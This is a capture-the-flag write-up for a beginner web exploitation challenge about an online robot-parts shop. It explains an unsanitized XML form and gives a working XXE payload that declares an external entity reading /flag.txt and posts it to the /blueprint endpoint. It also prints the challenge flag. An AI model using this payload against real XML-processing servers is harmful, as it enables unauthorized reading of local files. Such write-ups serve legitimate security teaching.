# Parts Shop
Level: Beginner

Description:
```
We've found an online shop for robot parts. We suspect ARIA is trying to embody itself to take control of the physical world. You need to stop it ASAP! (Note: The flag is located in /flag.txt)

https://uscybercombine-s4-parts-shop.chals.io/
```

Writeup:
Web Exploitation challenge. At an initial glance, the landing page doesn't reveal much except that it displays the information for each of the parts within the shop and a `/blueprint` page. This newfound page consists of 4 entries from the user to create a new part. The source code reveals a vulnerability in the generateXML function: 
```
<script>
    function generateXML(event) {
      event.preventDefault();

      var name = document.getElementById('name').value;
      var author = document.getElementById('author').value;
      var image = document.getElementById('image').value;
      var description = document.getElementById('description').value;

      var payload = '<?xml version="1.0" encoding="UTF-8"?>\n' +
        '<part>\n' +
        '  <name>' + name + '</name>\n' +
        '  <author>' + author + '</author>\n' +
        '  <image>' + image + '</image>\n' +
        '  <description>' + description + '</description>\n' +
        '</part>';

      fetch("/blueprint", {
        method: "POST",
        body: payload,
      })
      .then(res => {
        if (res.redirected) {
          window.location.href = res.url;
        } else if (res.status == 400) {
          document.getElementById("error").innerHTML = "Please fill out all required fields.";
        }
      })
      .catch(error => console.error(error));
    }
</script>
```

There is no santization or validation in the XML structure which could enable an injection. The server acceptps the XML payload with no evidence of disabling the processing of external entities. We know from the prompt that the flag is hidden in the `/flag.txt` file. We will craft an XML Injection that will perform a forged server-side request to obtain the file with the flag:
```
function generateXXEPayload() {
  var payload = `<?xml version="1.0" encoding="UTF-8"?>\n` +
    `<!DOCTYPE part [\n` +
    `<!ENTITY xxe SYSTEM "file:///flag.txt">\n` + // declare an external entity "xxe" that references the file "flag.txt"
    `]>\n` +
    `<part>\n` +
    `  <name>&xxe;</name>\n` + // reference "xxe" in the name element
    `  <author>author</author>\n` +
    `  <image>https://example.com/image.jpg</image>\n` +
    `  <description>description</description>\n` +
    `</part>`;

  fetch("/blueprint", {
    method: "POST",
    body: payload,
    headers: {
      "Content-Type": "application/xml"
    }
  })
  .then(res => res.text()) // extract the response body as text
  .then(data => {
    console.log(data);  // log the response for analysis
    document.write("<pre>" + data + "</pre>");  // display the response for easier inspection
  })
  .catch(error => console.error(error));
}

// Execute the function to submit the payload
generateXXEPayload();
```

Run the generateXXEPayload function in the console and it will output a new part in the parts shop landing page. The part will contain the flag.

**Flag** - `SIVBGR{fu11y_upgr4d3d}`
